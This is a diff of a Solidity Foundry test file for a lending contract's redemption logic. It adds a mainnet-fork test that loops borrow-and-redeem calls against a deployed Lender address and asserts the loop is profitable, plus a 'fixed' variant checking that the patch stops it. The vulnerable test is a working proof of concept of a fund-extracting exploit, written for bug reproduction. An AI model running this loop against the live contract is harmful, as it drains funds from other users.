@@ -2264,15 +2264,17 @@ contract LenderTest is Test {
         assertApproxEqAbs(totalDebtReduction, _redeemAmount, 1, "Sum of debt reductions should equal total redeem amount");
     }
 
-    function test_repeated_redemptions_bug() public {
+    function test_repeated_redemptions_bug(int collateralPrice) public {
+        collateralPrice = bound(collateralPrice, 1e16, 1e25);
+
         // Setup: create multiple borrowers with redeemable debt
-        uint collateralAmount1 = 25000e18;
-        uint collateralAmount2 = 5000e18;
+        uint collateralAmount1 = 25e24;
+        uint collateralAmount2 = 5e23;
         uint borrowAmount1 = 1000e18;
         uint borrowAmount2 = 1000e18;
 
         // Set collateral price to $3000 (similar to eth)
-        FeedMock(address(lender.feed())).setPrice(3000e18);
+        FeedMock(address(lender.feed())).setPrice(collateralPrice);
         
         // Prepare test data
         address borrower1 = address(0xBEEF);
@@ -2297,7 +2299,7 @@ contract LenderTest is Test {
         lender.adjust(borrower1, int256(collateralAmount1), int256(borrowAmount1), true); // opt into redemptions
         vm.stopPrank();
 
-        for(uint i; i < 40; i++){
+        for(uint i; i < 100; i++){
             vm.startPrank(borrower1);
             lender.adjust(borrower1, int256(collateral.balanceOf(borrower1)), 0);
             (uint price,,) = lender.getCollateralPrice();
@@ -2324,7 +2326,7 @@ contract LenderTest is Test {
         }
     }
 
-    function test_repeated_redemptions_fork() public {
+    function test_repeated_redemptions_fork_vulnerable() public {
         string memory url = vm.rpcUrl("mainnet");
         uint mainnetFork = vm.createSelectFork(url, 22867366);
         lender = Lender(0x44AfC35b52dbeBF43e1940D4f12C372446D52D5A);
@@ -2367,19 +2369,77 @@ contract LenderTest is Test {
             uint redeemAmount = balance > maxRedeem ? maxRedeem : balance;
             lender.redeem(redeemAmount, 0);
             vm.stopPrank();
-            emit log_string("epoch");
-            emit log_uint(lender.epoch());
-            emit log_string("totalFreeDebtShares");
-            emit log_uint(lender.totalFreeDebtShares());
-            emit log_string("totalFreeDebt");
-            emit log_uint(lender.totalFreeDebt());
-            emit log_string("cachedCollateralBalance");
-            emit log_uint(lender._cachedCollateralBalances(borrower1));
-            emit log_string("Lender collateral balance");
-            emit log_uint(collateral.balanceOf(address(lender)));
-            emit log_string("borrower1 freeDebtShares");
-            emit log_uint(lender.freeDebtShares(borrower1));
+        }
+
+        assertGt(collateral.balanceOf(borrower1), collateralAmount1, "Profitable redemptions");
+    }
+
+    function test_repeated_redemptions_fork_fixed() public {
+        string memory url = vm.rpcUrl("mainnet");
+        uint mainnetFork = vm.createSelectFork(url, 22867366);
+        
+        // Get the existing Lender contract address
+        address lenderAddress = 0x44AfC35b52dbeBF43e1940D4f12C372446D52D5A;
+        lender = Lender(lenderAddress);
+        
+        // Deploy a new Lender contract with the same immutable variables as the existing contract
+        Lender newLenderImplementation = new Lender(
+            lender.collateral(),
+            lender.feed(),
+            lender.coin(),
+            lender.vault(),
+            lender.interestModel(),
+            lender.factory(),
+            lender.operator(), // use existing operator
+            lender.collateralFactor(),
+            lender.minDebt(),
+            365 days // dummy immutability deadline (this won't matter since we're replacing bytecode)
+        );
+        
+        // Replace the bytecode at the existing Lender address with the new implementation
+        vm.etch(lenderAddress, address(newLenderImplementation).code);
+        
+        // Setup: create multiple borrowers with redeemable debt
+        uint collateralAmount1 = 25000e18;
+        uint collateralAmount = 5000e18;
+        uint borrowAmount = 1000e18;
+        
+        // Prepare test data
+        address borrower1 = address(0xBEEF);
+        address borrower2 = address(0xF00D);
+        ERC20 collateral = ERC20(address(lender.collateral()));
+        ERC20 coin = ERC20(address(lender.coin()));
+        
+        // Setup: mint collateral to borrowers and coins to redeemer
+        deal(address(collateral), borrower1, collateralAmount1);
+        deal(address(collateral), borrower2, collateralAmount);
+
+        // Setup: borrower2 creates a redeemable position
+        vm.startPrank(borrower2);
+        collateral.approve(address(lender), collateralAmount);
+        lender.adjust(borrower2, int256(collateralAmount), int256(borrowAmount), true); // opt into redemptions
+        vm.stopPrank();
+
+        // Setup: borrower1 creates a redeemable position
+        vm.startPrank(borrower1);
+        collateral.approve(address(lender), type(uint).max);
+        coin.approve(address(lender), type(uint).max);
+        lender.adjust(borrower1, int256(collateralAmount1), int256(borrowAmount), true); // opt into redemptions
+        vm.stopPrank();
+
+        for(uint i; i < 40; i++){
+            vm.startPrank(borrower1);
+            lender.adjust(borrower1, int256(collateral.balanceOf(borrower1)), 0);
+            (uint price,,) = lender.getCollateralPrice();
+            uint borrowingPower = price * lender._cachedCollateralBalances(borrower1) * lender.collateralFactor() / 1e18 / 10000 - lender.getDebtOf(borrower1);
+            lender.adjust(borrower1, 0, int256(borrowingPower));
+            uint maxRedeem = collateral.balanceOf(address(lender)) * price * 10000 / 1e18 / (10000 - lender.redeemFeeBps());
+            uint balance = coin.balanceOf(borrower1);
+            uint redeemAmount = balance > maxRedeem ? maxRedeem : balance;
+            lender.redeem(redeemAmount, 0);
+            vm.stopPrank();
             assertLt(collateral.balanceOf(borrower1), collateralAmount1, "Profitable redemptions");
+
         }
     }
     
